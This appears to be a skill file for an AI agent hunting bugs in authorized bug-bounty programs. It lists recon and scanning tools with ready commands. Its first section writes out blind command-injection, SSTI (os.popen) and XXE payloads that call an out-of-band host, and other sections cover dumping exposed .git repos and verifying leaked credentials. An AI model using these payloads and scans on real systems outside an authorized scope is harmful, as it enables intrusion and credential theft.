---
name: modern-tooling-2026
description: "High-signal CLI tooling for critical/exceptional findings: out-of-band interaction (interactsh) for blind SSRF/RCE/XXE/SSTI/CMDi, secret scanning (trufflehog/gitleaks), JS intelligence (jsluice), GraphQL introspection (clairvoyance/graphw00f), nuclei DAST/fuzzing, plus the full recon-to-exploit arsenal (subdomain/DNS: amass/chaos/shuffledns/alterx/dnsgen/cero/tlsx/cdncheck/asnmap/uncover; URL+JS: waymore/urlfinder/hakrawler/gospider/subjs/getJS/linkfinder/mantra; content/API/param fuzzing: feroxbuster/gobuster/kiterunner/x8/paramspider/arjun; vuln quick-wins: kxss/Gxss/dalfox/crlfuzz/corsy/jaeles). Auto-loads for recon and for ssrf/rce/xxe/ssti/graphql/secret hunting, and any blind/OOB confirmation step. All tools are installed and on PATH (~/go/bin, ~/.local/bin, /usr/local/bin)."
---

# Modern Tooling 2026 — installed, verified, ready

These tools are installed locally. Invoke by PATH name. Use them on confirmed in-scope
assets only, and respect each program's rate limits (see rate-limit-pacing skill).

> Install/refresh the whole arsenal with `./extras.sh` (Linux) or `./extras-macos.sh` (macOS)
> from the xpow-hunt bundle (Go tools → `~/go/bin`, pipx → `~/.local/bin`, cargo/brew,
> plus `~/tools/{Corsy,LinkFinder}`). If a specific tool is missing at runtime, install just
> that one (`go install …` / `pipx install …` / `cargo install …` / `brew install …`) and continue.

## 1. Out-of-band interaction — interactsh-client  (blind/OOB confirmation = CRITICAL proof)

The decisive tool for blind SSRF, blind RCE/CMDi, blind XXE, blind SSTI, and DNS/HTTP
exfil. Use it to turn an unprovable "maybe" into a CRITICAL with hard OOB evidence.
(Burp Collaborator via the Burp MCP is the alternative when traffic must go through Burp.)

```bash
# Start a session; it prints a unique payload domain like cXXXX.oast.fun and live-polls.
interactsh-client -v
# JSON output to a file for headless hunts (poll the file for interactions):
interactsh-client -json -o /tmp/interactsh.txt &
```
Inject the printed domain into the candidate sink, then watch for DNS/HTTP callbacks:
- SSRF:  `http://<payload>.oast.fun/` (and metadata redirect chains)
- XXE:   `<!ENTITY x SYSTEM "http://<payload>.oast.fun/">`
- CMDi:  `; nslookup <payload>.oast.fun` / `| curl http://<payload>.oast.fun/`
- SSTI:  `{{config.__class__.__init__.__globals__['os'].popen('nslookup <payload>.oast.fun')}}`
A received interaction = confirmed. Capture the interactsh log line as evidence.

## 2. Secret scanning — trufflehog (verified) + gitleaks  (leaked creds → CRITICAL)

trufflehog *verifies* credentials (live check) — a verified secret is an instant high/critical.
```bash
trufflehog filesystem ./js_assets/ --only-verified --json          # downloaded JS/source
trufflehog git https://github.com/<org>/<repo> --only-verified      # in-scope public repos
gitleaks detect --source . --report-format json --report-path /tmp/gitleaks.json
gitleaks dir ./downloaded_assets --report-format json               # exposed bundles/configs
```
Pair with the `.git/HEAD` and `.env` checks in recon-checklist: if `.git` is exposed,
dump it then run gitleaks/trufflehog over the reconstructed repo.

## 3. JavaScript intelligence — jsluice  (hidden endpoints/secrets, highest recon signal)

Goes beyond regex grep: AST-parses JS for URLs, paths, and secrets.
```bash
cat app.js | jsluice urls            # extract endpoints/paths (feed to nuclei/ffuf/Burp)
cat app.js | jsluice secrets         # extract API keys/tokens
katana -u https://target -jc -d 3 | grep '\.js' | while read u; do curl -s "$u" | jsluice urls; done
```
Route discovered endpoints to the relevant specialist (IDOR/BOLA, auth, SSRF).

## 4. GraphQL — clairvoyance + graphw00f  (introspection-disabled bypass)

```bash
graphw00f -d -f -t https://target/graphql                          # fingerprint engine -> CVE mapping
clairvoyance -o schema.json https://target/graphql                 # reconstruct schema when introspection is OFF
```
With a reconstructed schema, hunt missing authorization on resolvers (BOLA/BFLA) — a
top critical source. Also test introspection directly first (`{__schema{types{name}}}`).

## 5. nuclei DAST / fuzzing  (modern active templates, not just version checks)

nuclei v3.9 + fuzzing-templates at `~/fuzzing-templates`. Use DAST mode for injection classes.
```bash
nuclei -l live_hosts.txt -dast -t ~/fuzzing-templates/ -rl 10 -c 10
nuclei -u https://target -dast -tags ssrf,sqli,xss,ssti,cmdi -rl 10
# Always pace with -rl (rate limit) to stay within program limits.
```

## 6. Recon helpers — mapcidr, notify, asnmap

```bash
mapcidr -cidr 192.0.2.0/24 -silent            # expand/aggregate CIDR for in-scope ranges
notify -bulk -data findings.txt               # optional: pipe alerts (configure ~/.config/notify)
```

## 7. Subdomain & DNS recon — amass, chaos, shuffledns(+massdns), alterx, dnsgen, cero, tlsx, cdncheck, asnmap, uncover

> Confirm exact flags with `<tool> -h` before a large run. Tools marked (API) need a key in env/config.
```bash
# Passive enumeration (union + dedupe with anew):
subfinder -d target.com -all -silent | anew subs.txt
amass enum -passive -d target.com -silent | anew subs.txt
chaos -d target.com -silent | anew subs.txt                  # (API: PDCP_API_KEY) ProjectDiscovery Chaos DB
findomain -t target.com -q   | anew subs.txt
# Permutations -> resolve (massdns is shuffledns' backend; supply a resolvers list):
alterx -l subs.txt -silent | anew perms.txt
dnsgen subs.txt            | anew perms.txt
shuffledns -d target.com -w perms.txt -r resolvers.txt -mode resolve -silent | anew resolved.txt
puredns resolve perms.txt -r resolvers.txt --quiet | anew resolved.txt
dnsx -l resolved.txt -silent -a -resp | anew dnsx.txt
# Cert / ASN / CDN pivots:
cero target.com:443 | anew san.txt                           # SAN names straight off the TLS cert
tlsx -l hosts.txt -san -cn -silent                           # cert intel at scale
asnmap -d target.com -silent | anew asn.txt                  # org -> ASN -> CIDR (feed to mapcidr)
cdncheck -l hosts.txt -resp                                  # flag CDN/WAF IPs (do NOT port-scan those)
uncover -q 'ssl:"target.com"' -e shodan,censys,fofa -silent  # (API) internet-wide host discovery
```

## 8. URL & JS discovery — waymore, urlfinder, hakrawler, gospider, gau, katana, subjs, getJS, linkfinder, mantra

```bash
# Historical + live URLs (union -> dedupe into one corpus):
waymore -i target.com -mode U -oU waymore.txt                # deepest archive puller (Wayback/CC/URLScan/VT)
urlfinder -d target.com -silent | anew urls.txt              # PD passive URL aggregator
gau --threads 5 target.com      | anew urls.txt
katana -u https://target.com -jc -kf all -d 3 -silent | anew urls.txt
hakrawler -u https://target.com -d 3 -subs | anew urls.txt
gospider -s https://target.com -d 3 -c 10 -q | anew urls.txt
# JS files -> endpoints + secrets:
subjs -i hosts.txt | anew js.txt
getJS --url https://target.com --complete | anew js.txt
cat js.txt | while read u; do curl -s "$u" | jsluice urls; done | anew js_endpoints.txt
cat js.txt | mantra -d                                       # API keys/secrets in JS (brosck/mantra)
linkfinder -i 'https://target.com/main.js' -o cli            # endpoints from a single bundle
```

## 9. Content / API / parameter discovery — feroxbuster, gobuster, ffuf, kr, x8, paramspider, arjun

```bash
# Recursive content discovery:
feroxbuster -u https://target.com -w /usr/local/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,json,bak -r -o ferox.txt
gobuster dir -u https://target.com -w /usr/local/share/seclists/Discovery/Web-Content/common.txt -k -b 404,403 -o gobuster.txt
ffuf -u https://target.com/FUZZ -w /usr/local/share/seclists/Discovery/Web-Content/raft-medium-files.txt -fc 404 -o ffuf.json
# API-route discovery (kiterunner is API-aware; .kite routes from assetnote wordlists, or plain txt via `kr brute`):
kr scan https://target.com -w ~/wordlists/routes-large.kite -x 20 -j 100
# Hidden parameter mining (-> expands IDOR/SSRF/XSS surface):
x8 -u 'https://target.com/api/v1/user' -w /usr/local/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
arjun -u 'https://target.com/api/v1/user' -oT arjun.txt
paramspider -d target.com                                    # params mined from archives -> results/
```

## 10. Targeted vuln quick-wins — kxss/Gxss, dalfox, crlfuzz, corsy, jaeles

```bash
# Reflected-XSS triage pipeline (cheap, high signal):
cat urls.txt | kxss                        # reports params whose special chars reflect UNFILTERED
cat urls.txt | Gxss -c 100                  # parallel reflection check
cat urls.txt | dalfox pipe --skip-bav       # confirm/scan XSS on reflected params
crlfuzz -l urls.txt                         # CRLF / response splitting
corsy -i hosts.txt                          # CORS ACAO-reflection misconfig
jaeles scan -u https://target.com -s ~/.jaeles/base-signatures   # run `jaeles config init` once to fetch sigs
```

## Selection rule (expanded)
- OOB (interactsh) the moment a sink is plausibly blind — blind confirmation moves a finding Medium → Critical.
- trufflehog + jsluice + mantra on every JS bundle and every exposed repo/config; clairvoyance whenever a
  GraphQL endpoint returns auth/permission errors with introspection disabled.
- Recon order: subfinder+amass+chaos+findomain → alterx/dnsgen permutations → shuffledns/puredns resolve →
  dnsx → httpx. Pivot org→IP space with asnmap→mapcidr and cero/tlsx; drop CDN/WAF IPs via cdncheck before scanning.
- URL/JS: union waymore+urlfinder+gau+katana+hakrawler+gospider into one `anew urls.txt`; subjs/getJS → jsluice/
  mantra/linkfinder for JS endpoints+secrets.
- Then params (x8/arjun/paramspider) → reflected-XSS triage (kxss/Gxss → dalfox), content/API (feroxbuster/kr).
- Keep every high-volume pass within the program's documented rate limits (rate-limit-pacing skill) and confirm
  flags with `<tool> -h` first — flag names drift between versions.
